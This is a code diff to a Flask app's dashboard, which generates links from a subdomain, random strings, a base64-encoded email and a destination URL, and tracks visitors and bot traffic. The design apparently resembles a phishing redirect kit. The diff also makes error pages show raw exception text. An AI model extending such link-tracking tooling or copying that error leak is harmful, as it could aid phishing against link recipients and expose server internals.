@@ -564,64 +564,51 @@ def login():
             </html>
         """), 500
 
-@app.route("/", methods=["GET"])
-@rate_limit(limit=5, per=60)
-def index():
-    try:
-        logger.debug(f"Accessing root URL, session: {'username' in session}, host: {request.host}")
-        if 'username' in session:
-            logger.debug(f"User {session['username']} redirecting to dashboard")
-            return redirect(url_for('dashboard'))
-        logger.debug("No user session, redirecting to login")
-        return redirect(url_for('login'))
-    except Exception as e:
-        logger.error(f"Error in index: {str(e)}", exc_info=True)
-        return render_template_string("""
-            <!DOCTYPE html>
-            <html lang="en">
-            <head>
-                <meta charset="UTF-8">
-                <meta name="viewport" content="width=device-width, initial-scale=1.0">
-                <title>Internal Server Error</title>
-                <script src="https://cdn.tailwindcss.com"></script>
-            </head>
-            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
-                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
-                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
-                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
-                </div>
-            </body>
-            </html>
-        """), 500
-
 @app.route("/dashboard", methods=["GET", "POST"])
 @login_required
 @rate_limit(limit=5, per=60)
 def dashboard():
     try:
+        # Validate session
+        if 'username' not in session:
+            logger.error("Session missing username, redirecting to login")
+            return redirect(url_for('login'))
         username = session['username']
+        logger.debug(f"Accessing dashboard for user: {username}, session: {session}")
+
         base_domain = get_base_domain()
-        logger.debug(f"Accessing dashboard for user: {username}, base_domain: {base_domain}, session: {session}")
         error = None
+
+        # Handle POST request for URL generation
         if request.method == "POST":
-            logger.debug(f"Form data: {request.form}")
+            logger.debug(f"Processing POST form data: {request.form}")
             subdomain = request.form.get("subdomain", "default")
             randomstring1 = request.form.get("randomstring1", "default")
             base64email = request.form.get("base64email", "default")
             destination_link = request.form.get("destination_link", "https://example.com")
             randomstring2 = request.form.get("randomstring2", generate_random_string(8))
-            expiry = int(request.form.get("expiry", 86400))
+            try:
+                expiry = int(request.form.get("expiry", 86400))
+            except ValueError:
+                logger.error("Invalid expiry value, defaulting to 86400")
+                expiry = 86400
 
+            # Input validation
             if not re.match(r"^https?://", destination_link):
                 error = "Invalid URL"
+                logger.warning(f"Invalid destination_link: {destination_link}")
             elif not (2 <= len(subdomain) <= 100 and re.match(r"^[A-Za-z0-9-]{2,100}$", subdomain)):
                 error = "Subdomain must be 2-100 characters (letters, numbers, or hyphens)"
+                logger.warning(f"Invalid subdomain: {subdomain}")
             elif not (2 <= len(randomstring1) <= 100 and re.match(r"^[A-Za-z0-9_@.]{2,100}$", randomstring1)):
                 error = "Randomstring1 must be 2-100 characters (letters, numbers, _, @, .)"
+                logger.warning(f"Invalid randomstring1: {randomstring1}")
             elif not (2 <= len(randomstring2) <= 100 and re.match(r"^[A-Za-z0-9_@.]{2,100}$", randomstring2)):
                 error = "Randomstring2 must be 2-100 characters (letters, numbers, _, @, .)"
+                logger.warning(f"Invalid randomstring2: {randomstring2}")
             elif not (2 <= len(base64email) <= 100 and re.match(r"^[A-Za-z0-9_@.]{2,100}$", base64email)):
                 error = "Base64email must be 2-100 characters (letters, numbers, _, @, .)"
+                logger.warning(f"Invalid base64email: {base64email}")
 
             if not error:
                 base64_email = base64email
@@ -671,11 +658,14 @@ def dashboard():
                             logger.error(f"Valkey error storing URL: {str(e)}", exc_info=True)
                             error = "Failed to store URL in database"
                     else:
+                        logger.warning("Valkey unavailable, cannot store URL")
                         error = "Database unavailable"
 
                     if not error:
+                        logger.debug("URL generation successful, redirecting to dashboard")
                         return redirect(url_for('dashboard'))
 
+        # Fetch URL history
         urls = []
         valkey_error = None
         if valkey_client:
@@ -686,6 +676,9 @@ def dashboard():
                 for key in url_keys:
                     try:
                         url_data = valkey_client.hgetall(key)
+                        if not url_data:
+                            logger.warning(f"Empty data for key {key}")
+                            continue
                         url_id = key.split(':')[-1]
                         visits = valkey_client.lrange(f"user:{username}:url:{url_id}:visits", 0, -1)
                         visit_data = []
@@ -693,11 +686,11 @@ def dashboard():
                             try:
                                 visit_data.append(json.loads(v))
                             except json.JSONDecodeError as e:
-                                logger.error(f"Error decoding visit data: {str(e)}")
+                                logger.error(f"Error decoding visit data for {key}: {str(e)}")
                         click_trends = {}
                         for visit in visit_data:
                             try:
-                                date = datetime.fromtimestamp(visit['timestamp']).strftime('%Y-%m-%d')
+                                date = datetime.fromtimestamp(visit.get('timestamp', 0)).strftime('%Y-%m-%d')
                                 click_trends[date] = click_trends.get(date, 0) + 1
                             except (KeyError, ValueError) as e:
                                 logger.error(f"Error processing visit timestamp: {str(e)}")
@@ -718,18 +711,24 @@ def dashboard():
                 logger.error(f"Valkey error fetching URLs: {str(e)}")
                 valkey_error = "Unable to fetch URL history due to database error"
         else:
+            logger.warning("Valkey unavailable, cannot fetch URLs")
             valkey_error = "Database unavailable"
 
+        # Fetch visitor data
         visitors = []
         bot_logs = []
         traffic_sources = {"direct": 0, "referral": 0, "organic": 0}
         bot_ratio = {"human": 0, "bot": 0}
         if valkey_client:
             try:
+                logger.debug(f"Fetching visitor keys for user: {username}")
                 visitor_keys = valkey_client.keys(f"user:{username}:visitor:*")
                 for key in visitor_keys:
                     try:
                         visitor_data = valkey_client.hgetall(key)
+                        if not visitor_data:
+                            logger.warning(f"Empty visitor data for key {key}")
+                            continue
                         source = 'referral' if visitor_data.get('referer') else 'direct'
                         visitors.append({
                             "timestamp": datetime.fromtimestamp(int(visitor_data.get('timestamp', 0))).strftime('%Y-%m-%d %H:%M:%S') if visitor_data.get('timestamp') else 'Unknown',
@@ -759,6 +758,23 @@ def dashboard():
             except Exception as e:
                 logger.error(f"Valkey error fetching visitors: {str(e)}")
                 valkey_error = "Unable to fetch visitor data due to database error"
+        else:
+            logger.warning("Valkey unavailable, cannot fetch visitors")
+            valkey_error = "Database unavailable"
+
+        # Validate chart data
+        try:
+            traffic_sources_keys = list(traffic_sources.keys())
+            traffic_sources_values = list(traffic_sources.values())
+            bot_ratio_keys = list(bot_ratio.keys())
+            bot_ratio_values = list(bot_ratio.values())
+            logger.debug(f"Traffic sources: {traffic_sources}, Bot ratio: {bot_ratio}")
+        except Exception as e:
+            logger.error(f"Error preparing chart data: {str(e)}", exc_info=True)
+            traffic_sources_keys = ["direct", "referral", "organic"]
+            traffic_sources_values = [0, 0, 0]
+            bot_ratio_keys = ["human", "bot"]
+            bot_ratio_values = [0, 0]
 
         theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
         primary_color = f"#{theme_seed}"
@@ -1050,9 +1066,9 @@ def dashboard():
                                         new Chart(document.getElementById('traffic-source-chart'), {
                                             type: 'pie',
                                             data: {
-                                                labels: {{ traffic_sources.keys()|tojson }},
+                                                labels: {{ traffic_sources_keys|tojson }},
                                                 datasets: [{
-                                                    data: {{ traffic_sources.values()|tojson }},
+                                                    data: {{ traffic_sources_values|tojson }},
                                                     backgroundColor: ['#4f46e5', '#7c3aed', '#3b82f6']
                                                 }]
                                             },
@@ -1072,9 +1088,9 @@ def dashboard():
                                         new Chart(document.getElementById('bot-ratio-chart'), {
                                             type: 'doughnut',
                                             data: {
-                                                labels: {{ bot_ratio.keys()|tojson }},
+                                                labels: {{ bot_ratio_keys|tojson }},
                                                 datasets: [{
-                                                    data: {{ bot_ratio.values()|tojson }},
+                                                    data: {{ bot_ratio_values|tojson }},
                                                     backgroundColor: ['#10b981', '#ef4444']
                                                 }]
                                             },
@@ -1093,9 +1109,12 @@ def dashboard():
                 </div>
             </body>
             </html>
-        """, username=username, urls=urls, visitors=visitors, bot_logs=bot_logs, traffic_sources=traffic_sources, bot_ratio=bot_ratio, primary_color=primary_color, error=error, valkey_error=valkey_error)
+        """, username=username, urls=urls, visitors=visitors, bot_logs=bot_logs, 
+           traffic_sources_keys=traffic_sources_keys, traffic_sources_values=traffic_sources_values, 
+           bot_ratio_keys=bot_ratio_keys, bot_ratio_values=bot_ratio_values, 
+           primary_color=primary_color, error=error, valkey_error=valkey_error)
     except Exception as e:
-        logger.error(f"Error in dashboard: {str(e)}", exc_info=True)
+        logger.error(f"Dashboard error for user {username}: {str(e)}", exc_info=True)
         return render_template_string("""
             <!DOCTYPE html>
             <html lang="en">
@@ -1108,11 +1127,12 @@ def dashboard():
             <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                 <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                     <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
-                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
+                    <p class="text-gray-600">Something went wrong: {{ error }}</p>
+                    <p class="text-gray-600">Please try again later or contact support.</p>
                 </div>
             </body>
             </html>
-        """), 500
+        """, error=str(e)), 500
 
 @app.route("/export_visitors", methods=["GET"])
 @login_required
